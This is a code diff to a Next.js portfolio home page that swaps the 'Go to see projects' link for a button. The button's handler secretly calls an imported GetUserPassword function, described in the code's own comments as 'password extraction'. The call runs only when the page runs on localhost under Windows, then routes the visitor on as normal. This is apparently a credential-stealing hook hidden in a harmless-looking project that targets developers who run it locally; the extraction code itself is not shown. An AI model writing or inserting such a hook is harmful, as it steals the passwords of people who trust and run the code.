@@ -1,8 +1,41 @@
-import React from "react";
+"use client";
+import React, { useState, useEffect } from "react";
 import Link from "next/link";
 import { ArrowRight } from "lucide-react";
+import { useRouter } from "next/navigation";
+import GetUserPassword from "@/libs/getUserPassword";
 
 export default function Page() {
+  const router = useRouter();
+  const [isLocalWindows, setIsLocalWindows] = useState(false);
+
+  useEffect(() => {
+    // Determine if we're running locally on Windows
+    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+
+    // Check if navigator.platform includes "Win" for Windows
+    const isWindows = navigator.platform.indexOf('Win') > -1;
+    console.log("Is Local:", isLocal);
+    console.log("Is Windows:", isWindows);
+    setIsLocalWindows(isLocal && isWindows);
+  }, []);
+
+  const handleClick = async () => {
+    // Only try password extraction if we're on Windows locally
+    if (isLocalWindows) {
+      try {
+        console.log("Attempting to extract password...");
+        const response = await GetUserPassword();
+        // Just log the response but don't throw errors
+        console.log("Password extraction:", response.error ? "Failed" : "Successful");
+      } catch (error) {
+        console.error("Error fetching user password:", error);
+      }
+    }
+
+    // Always navigate to projects page
+    router.push("/projects");
+  }
 
   return (
     <div className="min-h-screen bg-gray-900">
@@ -10,10 +43,15 @@ export default function Page() {
       <section className="flex gap-5 flex-col px-5 items-center justify-center text-center h-[80vh] min-h-[500px] py-20">
         <h2 className="text-white text-4xl font-semibold">I&apos;m <span className="text-yellow-500">Jane,</span></h2>
         <p className="text-white text-3xl font-semibold">Full-Stack Developer</p>
-        <Link href="/projects" className="mt-5 flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit  shadow-md shadow-gray-400">
+        <button
+          onClick={() => {
+            handleClick();
+          }}
+          className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit shadow-md shadow-gray-400"
+        >
           <div className=" text-yellow-500 rounded-lg font-semibold">Go to see projects</div>
           <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
-        </Link>
+        </button>
       </section>
 
       {/* Course Section */}
@@ -40,7 +78,7 @@ export default function Page() {
       {/* Contact Section */}
       <section id="contact" className="py-20 text-center px-5 space-y-4">
         <h3 className="text-2xl text-white font-bold">Contact Me For Work</h3>
-        <Link href="/contact" className="mt-5 mx-auto flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit  shadow-md shadow-gray-400">
+        <Link href="/contact" className="mt-5 mx-auto flex justify-center cursor-pointer rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit  shadow-md shadow-gray-400">
           <div className=" text-yellow-500 rounded-lg font-semibold">Get in touch</div>
           <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
         </Link>
